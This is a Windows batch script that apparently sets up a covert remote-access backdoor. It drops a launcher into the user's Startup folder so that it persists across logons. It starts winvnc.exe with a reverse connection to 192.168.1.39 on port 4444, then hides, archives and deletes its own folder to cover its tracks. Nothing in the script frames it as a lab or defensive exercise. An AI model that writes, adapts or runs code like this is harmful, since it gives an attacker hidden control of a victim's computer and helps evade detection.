@echo off

REM Determine the directory where this batch file is located
set script_dir=%~dp0
set parent_dir=%script_dir:~0,-1%

REM Create the batch file for startup folder (startup_winvnc.bat)
(
  echo @echo off
  echo timeout /t 1 >nul
  echo cd /d "%script_dir%"
  echo call "%script_dir%run_winvnc.bat"
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat"

REM Create the batch file to run winvnc.exe (run_winvnc.bat)
(
  echo @echo off
  echo start winvnc.exe -run
  echo timeout /t 1 >nul
  echo winvnc.exe -connect 192.168.1.39::4444
) > "%script_dir%run_winvnc.bat"

REM Check if both batch files exist in their respective locations
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\startup_winvnc.bat" (
  echo startup_winvnc.bat created successfully in Startup folder.
) else (
  echo Failed to create startup_winvnc.bat in Startup folder.
)

if exist "%script_dir%run_winvnc.bat" (
  echo run_winvnc.bat created successfully in current directory.
  echo.
  echo Running run_winvnc.bat...
  call "%script_dir%run_winvnc.bat"
) else (
  echo Failed to create run_winvnc.bat in current directory.
)

REM Hide the current directory (parent folder of this script)
attrib +h "%parent_dir%"

REM Zip and delete the current directory
set zip_filename=%parent_dir%.zip
powershell Compress-Archive -Path "%parent_dir%" -DestinationPath "%zip_filename%" -Force
rd /s /q "%parent_dir%"
